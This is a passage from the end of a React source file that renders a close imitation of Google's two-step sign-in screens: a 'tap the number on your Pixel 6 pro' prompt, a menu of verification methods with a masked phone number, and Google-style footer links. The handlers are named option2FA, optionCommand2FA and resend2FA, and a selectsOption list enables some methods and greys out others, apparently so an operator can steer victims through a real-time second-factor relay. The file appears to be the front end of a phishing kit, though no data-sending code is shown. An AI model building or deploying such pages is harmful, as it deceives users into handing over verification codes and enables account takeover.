C-7.025000095367432,4.4670000076293945 -6.611999988555908,5.011000156402588 -6.679999828338623,5.6020002365112305 C-6.679999828338623,5.6020002365112305 -6.881999969482422,7.355999946594238 -6.881999969482422,7.355999946594238 C-6.984000205993652,8.244000434875488 -6.038000106811523,8.901000022888184 -5.186999797821045,8.534000396728516 C-5.186999797821045,8.534000396728516 -3.505000114440918,7.808000087738037 -3.505000114440918,7.808000087738037 C-2.937999963760376,7.563000202178955 -2.2699999809265137,7.770999908447266 -1.9620000123977661,8.288000106811523 C-1.9620000123977661,8.288000106811523 -1.0479999780654907,9.819999694824219 -1.0479999780654907,9.819999694824219 C-0.5849999785423279,10.595999717712402 0.5849999785423279,10.595999717712402 1.0479999780654907,9.819999694824219 C1.0479999780654907,9.819999694824219 1.9620000123977661,8.288000106811523 1.9620000123977661,8.288000106811523 C2.2699999809265137,7.770999908447266 2.937999963760376,7.563000202178955 3.505000114440918,7.808000087738037 C3.505000114440918,7.808000087738037 5.186999797821045,8.534000396728516 5.186999797821045,8.534000396728516 C6.038000106811523,8.901000022888184 6.984000205993652,8.244000434875488 6.881999969482422,7.355999946594238 C6.881999969482422,7.355999946594238 6.679999828338623,5.6020002365112305 6.679999828338623,5.6020002365112305 C6.611999988555908,5.011000156402588 7.025000095367432,4.4670000076293945 7.633999824523926,4.3460001945495605 C7.633999824523926,4.3460001945495605 9.4399995803833,3.98799991607666 9.4399995803833,3.98799991607666 C10.354000091552734,3.806999921798706 10.71500015258789,2.743000030517578 10.086999893188477,2.0820000171661377 C10.086999893188477,2.0820000171661377 8.845999717712402,0.7760000228881836 8.845999717712402,0.7760000228881836 C8.428000450134277,0.335999995470047 8.428000450134277,-0.335999995470047 8.845999717712402,-0.7760000228881836 C8.845999717712402,-0.7760000228881836 10.086999893188477,-2.0820000171661377 10.086999893188477,-2.0820000171661377 C10.71500015258789,-2.743000030517578 10.354000091552734,-3.806999921798706 9.4399995803833,-3.98799991607666 C9.4399995803833,-3.98799991607666 7.633999824523926,-4.3460001945495605 7.633999824523926,-4.3460001945495605 C7.025000095367432,-4.4670000076293945 6.611999988555908,-5.011000156402588 6.679999828338623,-5.6020002365112305 C6.679999828338623,-5.6020002365112305 6.881999969482422,-7.355999946594238 6.881999969482422,-7.355999946594238 C6.984000205993652,-8.244000434875488 6.038000106811523,-8.901000022888184 5.186999797821045,-8.534000396728516 C5.186999797821045,-8.534000396728516 3.505000114440918,-7.808000087738037 3.505000114440918,-7.808000087738037 C2.937999963760376,-7.563000202178955 2.2699999809265137,-7.770999908447266 1.9620000123977661,-8.288000106811523 C1.9620000123977661,-8.288000106811523 1.0479999780654907,-9.819999694824219 1.0479999780654907,-9.819999694824219z"
                          />
                        </g>
                      </g>
                      <g
                        transform="matrix(0.3241671621799469,0,0,0.3241671621799469,590.0639038085938,342.06304931640625)"
                        opacity={0.9230423042299379}
                      >
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            strokeLinecap="butt"
                            strokeLinejoin="miter"
                            fillOpacity={0}
                            strokeMiterlimit={4}
                            stroke="rgb(19,19,20)"
                            strokeOpacity={1}
                            strokeWidth={7}
                            d=" M-31.5,-18 C-31.5,-18 -11.75,2 -11.75,2 C-11.75,2 28.25,-37.75 28.25,-37.75"
                          />
                        </g>
                      </g>
                      <g
                        transform="matrix(-4.4591498374938965,4.617584705352783,-4.617584705352783,-4.4591498374938965,477.4894714355469,202.8728790283203)"
                        opacity={1}
                      >
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            fill="rgb(131,172,241)"
                            fillOpacity={1}
                            d=" M6.853000164031982,-7.698999881744385 C6.5920000076293945,-7.813000202178955 6.26800012588501,-7.835000038146973 5.620999813079834,-7.879000186920166 C5.620999813079834,-7.879000186920166 4.144000053405762,-7.979000091552734 4.144000053405762,-7.979000091552734 C3.881999969482422,-7.997000217437744 3.752000093460083,-8.005999565124512 3.627000093460083,-8.034000396728516 C3.446000099182129,-8.074999809265137 3.2739999294281006,-8.147000312805176 3.117000102996826,-8.246000289916992 C3.007999897003174,-8.314000129699707 2.9100000858306885,-8.401000022888184 2.7119998931884766,-8.572999954223633 C2.7119998931884766,-8.572999954223633 1.597000002861023,-9.545999526977539 1.597000002861023,-9.545999526977539 C1.1080000400543213,-9.972000122070312 0.8640000224113464,-10.1850004196167 0.5979999899864197,-10.288999557495117 C0.21299999952316284,-10.4399995803833 -0.21299999952316284,-10.4399995803833 -0.5979999899864197,-10.288999557495117 C-0.8640000224113464,-10.1850004196167 -1.1080000400543213,-9.972000122070312 -1.597000002861023,-9.545999526977539 C-1.597000002861023,-9.545999526977539 -2.7119998931884766,-8.572999954223633 -2.7119998931884766,-8.572999954223633 C-2.9100000858306885,-8.401000022888184 -3.007999897003174,-8.314000129699707 -3.117000102996826,-8.246000289916992 C-3.2739999294281006,-8.147000312805176 -3.446000099182129,-8.074999809265137 -3.627000093460083,-8.034000396728516 C-3.752000093460083,-8.005999565124512 -3.881999969482422,-7.997000217437744 -4.144000053405762,-7.979000091552734 C-4.144000053405762,-7.979000091552734 -5.620999813079834,-7.879000186920166 -5.620999813079834,-7.879000186920166 C-6.26800012588501,-7.835000038146973 -6.5920000076293945,-7.813000202178955 -6.853000164031982,-7.698999881744385 C-7.230999946594238,-7.533999919891357 -7.533999919891357,-7.230999946594238 -7.698999881744385,-6.853000164031982 C-7.813000202178955,-6.5920000076293945 -7.835000038146973,-6.26800012588501 -7.879000186920166,-5.620999813079834 C-7.879000186920166,-5.620999813079834 -7.979000091552734,-4.144000053405762 -7.979000091552734,-4.144000053405762 C-7.997000217437744,-3.881999969482422 -8.005999565124512,-3.752000093460083 -8.034000396728516,-3.627000093460083 C-8.074999809265137,-3.446000099182129 -8.147000312805176,-3.2739999294281006 -8.246000289916992,-3.117000102996826 C-8.314000129699707,-3.007999897003174 -8.401000022888184,-2.9100000858306885 -8.572999954223633,-2.7119998931884766 C-8.572999954223633,-2.7119998931884766 -9.545999526977539,-1.597000002861023 -9.545999526977539,-1.597000002861023 C-9.972000122070312,-1.1080000400543213 -10.1850004196167,-0.8640000224113464 -10.288999557495117,-0.5979999899864197 C-10.4399995803833,-0.21299999952316284 -10.4399995803833,0.21299999952316284 -10.288999557495117,0.5979999899864197 C-10.1850004196167,0.8640000224113464 -9.972000122070312,1.1080000400543213 -9.545999526977539,1.597000002861023 C-9.545999526977539,1.597000002861023 -8.572999954223633,2.7119998931884766 -8.572999954223633,2.7119998931884766 C-8.401000022888184,2.9100000858306885 -8.314000129699707,3.007999897003174 -8.246000289916992,3.117000102996826 C-8.147000312805176,3.2739999294281006 -8.074999809265137,3.446000099182129 -8.034000396728516,3.627000093460083 C-8.005999565124512,3.752000093460083 -7.997000217437744,3.881999969482422 -7.979000091552734,4.144000053405762 C-7.979000091552734,4.144000053405762 -7.879000186920166,5.620999813079834 -7.879000186920166,5.620999813079834 C-7.835000038146973,6.26800012588501 -7.813000202178955,6.5920000076293945 -7.698999881744385,6.853000164031982 C-7.533999919891357,7.230999946594238 -7.230999946594238,7.533999919891357 -6.853000164031982,7.698999881744385 C-6.5920000076293945,7.813000202178955 -6.26800012588501,7.835000038146973 -5.620999813079834,7.879000186920166 C-5.620999813079834,7.879000186920166 -4.144000053405762,7.979000091552734 -4.144000053405762,7.979000091552734 C-3.881999969482422,7.997000217437744 -3.752000093460083,8.005999565124512 -3.627000093460083,8.034000396728516 C-3.446000099182129,8.074999809265137 -3.2739999294281006,8.147000312805176 -3.117000102996826,8.246000289916992 C-3.007999897003174,8.314000129699707 -2.9100000858306885,8.401000022888184 -2.7119998931884766,8.572999954223633 C-2.7119998931884766,8.572999954223633 -1.597000002861023,9.545999526977539 -1.597000002861023,9.545999526977539 C-1.1080000400543213,9.972000122070312 -0.8640000224113464,10.1850004196167 -0.5979999899864197,10.288999557495117 C-0.21299999952316284,10.4399995803833 0.21299999952316284,10.4399995803833 0.5979999899864197,10.288999557495117 C0.8640000224113464,10.1850004196167 1.1080000400543213,9.972000122070312 1.597000002861023,9.545999526977539 C1.597000002861023,9.545999526977539 2.7119998931884766,8.572999954223633 2.7119998931884766,8.572999954223633 C2.9100000858306885,8.401000022888184 3.007999897003174,8.314000129699707 3.117000102996826,8.246000289916992 C3.2739999294281006,8.147000312805176 3.446000099182129,8.074999809265137 3.627000093460083,8.034000396728516 C3.752000093460083,8.005999565124512 3.881999969482422,7.997000217437744 4.144000053405762,7.979000091552734 C4.144000053405762,7.979000091552734 5.620999813079834,7.879000186920166 5.620999813079834,7.879000186920166 C6.26800012588501,7.835000038146973 6.5920000076293945,7.813000202178955 6.853000164031982,7.698999881744385 C7.230999946594238,7.533999919891357 7.533999919891357,7.230999946594238 7.698999881744385,6.853000164031982 C7.813000202178955,6.5920000076293945 7.835000038146973,6.26800012588501 7.879000186920166,5.620999813079834 C7.879000186920166,5.620999813079834 7.979000091552734,4.144000053405762 7.979000091552734,4.144000053405762 C7.997000217437744,3.881999969482422 8.005999565124512,3.752000093460083 8.034000396728516,3.627000093460083 C8.074999809265137,3.446000099182129 8.147000312805176,3.2739999294281006 8.246000289916992,3.117000102996826 C8.314000129699707,3.007999897003174 8.401000022888184,2.9100000858306885 8.572999954223633,2.7119998931884766 C8.572999954223633,2.7119998931884766 9.545999526977539,1.597000002861023 9.545999526977539,1.597000002861023 C9.972000122070312,1.1080000400543213 10.1850004196167,0.8640000224113464 10.288999557495117,0.5979999899864197 C10.4399995803833,0.21299999952316284 10.4399995803833,-0.21299999952316284 10.288999557495117,-0.5979999899864197 C10.1850004196167,-0.8640000224113464 9.972000122070312,-1.1080000400543213 9.545999526977539,-1.597000002861023 C9.545999526977539,-1.597000002861023 8.572999954223633,-2.7119998931884766 8.572999954223633,-2.7119998931884766 C8.401000022888184,-2.9100000858306885 8.314000129699707,-3.007999897003174 8.246000289916992,-3.117000102996826 C8.147000312805176,-3.2739999294281006 8.074999809265137,-3.446000099182129 8.034000396728516,-3.627000093460083 C8.005999565124512,-3.752000093460083 7.997000217437744,-3.881999969482422 7.979000091552734,-4.144000053405762 C7.979000091552734,-4.144000053405762 7.879000186920166,-5.620999813079834 7.879000186920166,-5.620999813079834 C7.835000038146973,-6.26800012588501 7.813000202178955,-6.5920000076293945 7.698999881744385,-6.853000164031982 C7.533999919891357,-7.230999946594238 7.230999946594238,-7.533999919891357 6.853000164031982,-7.698999881744385z"
                          />
                        </g>
                      </g>
                      <g
                        transform="matrix(0.653217613697052,0,0,0.653217613697052,477.5120849609375,211.13897705078125)"
                        opacity={1}
                      >
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            strokeLinecap="butt"
                            strokeLinejoin="miter"
                            fillOpacity={0}
                            strokeMiterlimit={4}
                            stroke="rgb(19,19,20)"
                            strokeOpacity={1}
                            strokeWidth={9}
                            d=" M-31.5,-18 C-31.5,-18 -11.75,2 -11.75,2 C-11.75,2 28.25,-37.75 28.25,-37.75"
                          />
                        </g>
                      </g>
                    </g>
                  </g>
                </svg>
              </div>
            </div>
            <div className="w-[100%] flex flex-col mt-[30px] max-sm:mt-[180px] gap-y-3">
              <text className="text-white text-sm font-normal bg-[#0E0E0E]">Check your Google Pixel 6 pro</text>
              <text className="text-white text-sm font-normal bg-[#0E0E0E]">Google sent a notification to your Google Pixel 6 pro.<br/>Tap Yes on the notification, then tap {digit} on your phone to verify it is you.</text>
              <text className="text-white text-2xl font-normal bg-[#0E0E0E] text-center">{digit}</text>
              {error && <p className="text-red-600 text-sm font-light">{error}</p>}
              <label className="text-white text-sm font-normal flex items-center gap-x-4">
                <input className="appearance-none w-[16px] aspect-square border-[2px] border-white bg-transparent" type="checkbox" />
                Don't ask again on this device
              </label>
              <div className="w-[100%] max-sm:flex-col justify-end items-end flex flex-col gap-y-2 gap-x-8 mt-5">
                <button type="button" className="text-blue-300 text-sm" onClick={option2FA}>Try another way</button>
                <button type="button" className="text-blue-300 text-sm rounded-3xl font-medium min-[640px]:hidden" onClick={()=>resend2FA('tapyes')}>Resend it</button>
              </div>
            </div>
          </form>
        : (form === "2FAOptionForm") ?
          <form className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start flex flex-col gap-y-4 sm:pt-40px] ${slide && form === "2FAOptionForm" ? 'animate-present transition-opacity duration-300' : ''}`}>
            <span className="text-xl font-normal text-white">Choose how you want to sign in:</span>
            <div className="w-[100%] flex flex-col gap-y-1">
              {/* tap yes */}
              <button type="button" className={`${selectsOption.includes('Notification OTP') ? 'text-white' : 'text-white/30'} w-[100%] h-[50px] font-light bg-transparent border-b border-b-white border-opacity-10 text-base px-5 text-white flex flex-row items-center gap-x-3 cursor-pointer`} disabled={selectsOption.includes('Notification OTP') ? false : true} onClick={() => optionCommand2FA('tapyes')}>
                <div className="w-[23px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M18,8h-1V6c0-2.76-2.24-5-5-5S7,3.24,7,6v2H6c-1.1,0-2,0.9-2,2v10c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2V10 C20,8.9,19.1,8,18,8z M9,6c0-1.66,1.34-3,3-3s3,1.34,3,3v2H9V6z M18,20H6V10h12V20z M12,17c1.1,0,2-0.9,2-2c0-1.1-0.9-2-2-2 c-1.1,0-2,0.9-2,2C10,16.1,10.9,17,12,17z"></path></svg>
                </div>
                <span className="text-sm font-normal">Tap yes on your phone or tablet</span>
              </button>
              {/* Get sms verification code */}
              <button type="button" className={`${selectsOption.includes('SMS OTP') ? 'text-white' : 'text-white/30'} w-[100%] py-2 font-light bg-transparent border-b border-b-white border-opacity-10 text-base px-5 text-white flex flex-row items-center gap-x-3 cursor-pointer`} disabled={selectsOption.includes('SMS OTP') ? false : true} onClick={() => optionCommand2FA('smsotp')}>
                <div className="w-[23px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M18,8h-1V6c0-2.76-2.24-5-5-5S7,3.24,7,6v2H6c-1.1,0-2,0.9-2,2v10c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2V10 C20,8.9,19.1,8,18,8z M9,6c0-1.66,1.34-3,3-3s3,1.34,3,3v2H9V6z M18,20H6V10h12V20z M12,17c1.1,0,2-0.9,2-2c0-1.1-0.9-2-2-2 c-1.1,0-2,0.9-2,2C10,16.1,10.9,17,12,17z"></path></svg>
                </div>
                <div className="w-[100%] flex flex-col items-start">
                  <span className="text-sm font-semibold text-start">Get a verification code at **** *** **56</span>
                  <span className="text-xs font-light text-start">2 step verification phone</span>
                  <span className="text-xs font-thin text-start">Standard rates apply</span>
                </div>
              </button>
              {/* passkey */}
              <div className={`w-[100%] h-[50px] font-light bg-transparent border-b border-b-white border-opacity-10 text-base px-5 text-white/30 flex flex-row items-center gap-x-3 cursor-pointer`} onClick={() => optionCommand2FA('passkey')}>
                <div className="w-[23px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M18,8h-1V6c0-2.76-2.24-5-5-5S7,3.24,7,6v2H6c-1.1,0-2,0.9-2,2v10c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2V10 C20,8.9,19.1,8,18,8z M9,6c0-1.66,1.34-3,3-3s3,1.34,3,3v2H9V6z M18,20H6V10h12V20z M12,17c1.1,0,2-0.9,2-2c0-1.1-0.9-2-2-2 c-1.1,0-2,0.9-2,2C10,16.1,10.9,17,12,17z"></path></svg>
                </div>
                <span className="text-sm text-white font-normal">Use your passkey</span>
              </div>
              {/* Auth Otp */}
              <button type="button" className={`${selectsOption.includes('Google Authentication') ? 'text-white' : 'text-white/30'} w-[100%] h-[50px] font-light bg-transparent border-b border-b-white border-opacity-10 text-base px-5 text-white flex flex-row items-center gap-x-3 cursor-pointer`} disabled={selectsOption.includes('Google Authentication') ? false : true} onClick={() => optionCommand2FA('authotp')}>
                <div className="w-[23px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"></path></svg>
                </div>
                <span className="text-sm font-normal text-start">Get a verification code from the Google Authenticator app</span>
              </button>
              {/* noResolve */}
              <div className={`w-[100%] h-[50px] font-light bg-transparent px-5 text-white flex flex-row items-center gap-x-3 cursor-pointer`} onClick={() => optionCommand2FA('recovery')}>
                <div className="w-[23px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"></path></svg>
                </div>
                <span className="text-sm text-white font-normal">Try another way</span>
              </div>
            </div>
          </form>
        :
          <></>
        }
      </div>
      {/* settings */}
      <Settings/>
       
    </div>
  );
}

function Settings() {
  return(
    <div className="max-[600px]:w-[100%] max-sm:w-[80%] max-[959px]:w-[100%] max-lg:w-[85%] w-[70%] pb-4 max-[400px]:h-fit h-[8vh] flex max-[400px]:flex-col flex-row max-[400px]:items-start justify-between max-[600px]:px-8 max-sm:px-2 max-[959px]:px-14 px-2 max-[600px]:bg-[#0E0E0E] max-sm:bg-transparent max-[959px]:bg-[#0E0E0E] bg-transparent">
      <div className="py-4 w-fit flex flex-row justify-start items-center max-sm:gap-x-4 gap-x-8 hover:bg-white/50">
        <text className="text-white text-xs font-normal whitespace-nowrap">English (United States)</text>
        <div className="max-[400px]:w-[1.8vw] max-[600px]:w-[1.2vw] max-sm:w-[0.9vw] max-[959px]:w-[0.8vw] max-lg:w-[0.6vw] w-[0.5vw] aspect-square pt-1">
          <svg viewBox="0 0 512 512">
            <g>
              <path d="M501.912 108.584c6.863 14.346 4.934 30.947-5.033 43.333L287.928 411.423c-7.81 9.673-19.444 15.261-31.895 15.261s-24.085-5.588-31.895-15.261L15.121 151.949c-9.967-12.418-11.895-29.019-5.033-43.365 6.863-14.346 21.013-23.268 36.928-23.268h417.968c15.915 0 30.065 8.922 36.928 23.268" fill="#fff" opacity="0.6" data-original="#000000"></path>
            </g>
          </svg>
        </div>
      </div>
      <div className="flex flex-row justify-center gap-x-10">
        <button className="text-xs font-normal text-white">Help</button>
        <button className="text-xs font-normal text-white">Privacy</button>
        <button className="text-xs font-normal text-white">Terms</button>
      </div>
    </div>
  )
}

export default App;
